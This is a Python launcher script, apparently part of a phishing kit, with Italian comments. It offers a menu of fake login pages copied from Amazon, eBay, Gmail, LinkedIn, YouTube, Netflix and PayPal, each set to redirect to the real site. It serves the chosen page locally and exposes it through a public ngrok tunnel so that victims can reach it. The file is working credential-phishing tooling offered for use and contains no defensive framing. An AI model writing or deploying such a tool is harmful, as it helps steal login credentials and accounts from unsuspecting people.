from utils import print_welcome_message
from dotenv import load_dotenv
import ngrok
import os
import subprocess
import socket
import atexit
import time

load_dotenv()

sites = {
    "1": {"name": "Amazon", "html": "apps/amazon/amazon.html", "redirect": "https://amazon.com"},
    "2": {"name": "Ebay", "html": "apps/ebay/ebay.html", "redirect": "https://ebay.com"},
    "3": {"name": "Gmail", "html": "apps/gmail/gmail.html", "redirect": "https://mail.google.com"},
    "4": {"name": "LinkedIn", "html": "apps/linkedin/linkedin.html", "redirect": "https://linkedin.com"},
    "5": {"name": "YouTube", "html": "apps/youtube/youtube.html", "redirect": "https://youtube.com"},
    "6": {"name": "Netflix", "html": "apps/netflix/netflix.html", "redirect": "https://netflix.com"},
    "7": {"name": "PayPal", "html": "apps/paypal/paypal.html", "redirect": "https://paypal.com"},
}

server_process = None
ngrok_tunnel = None

def is_port_in_use(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex(('localhost', port)) == 0

def start_ngrok():
    global server_process, ngrok_tunnel
    
    # Prima ferma eventuali processi esistenti
    cleanup()
    
    if is_port_in_use(8000):
        print("Porta 8000 già in uso! Provando con una porta alternativa...")
        port = find_available_port(8000)
        if port is None:
            print("Nessuna porta disponibile trovata")
            return None
    else:
        port = 8000
    
    server_process = subprocess.Popen(["python", "-m", "http.server", str(port)])
    
    # Configura ngrok
    try:
        ngrok.set_auth_token(os.getenv("NGROK_AUTHTOKEN"))
        ngrok_tunnel = ngrok.connect(str(port), proto="http", bind_tls=True)
        public_url = ngrok_tunnel.url()  # Modificato per la nuova API ngrok
        atexit.register(cleanup)
        return public_url
    except Exception as e:
        print(f"Errore ngrok: {e}")
        cleanup()
        return None

def find_available_port(start_port, max_attempts=10):
    for port in range(start_port, start_port + max_attempts):
        if not is_port_in_use(port):
            return port
    return None

def cleanup():
    global server_process, ngrok_tunnel
    if ngrok_tunnel:
        try:
            ngrok.disconnect(ngrok_tunnel.url())
        except:
            pass
    if server_process:
        server_process.terminate()
        server_process.wait()
    server_process = None
    ngrok_tunnel = None

def main():
    print_welcome_message()

    # Stampa tutte le opzioni disponibili
    for key, value in sites.items():
        print(f"[{key}] {value['name']}")

    choice = input("\nInsert your choice: ")

    if choice in sites:
        selected = sites[choice]
        print(f"\nYou choose {selected['name']}")
        
        public_url = start_ngrok()
        if public_url:
            print(f"\nPublic URL: {public_url}")
            print(f"Local URL: http://localhost:8000/{selected['html']}")
            print("\nPress Ctrl+C to stop the server")
            
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\nStopping server...")
        else:
            print("Impossibile avviare il server")
    else:
        print("Invalid choice")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"Errore: {e}")
    finally:
        cleanup()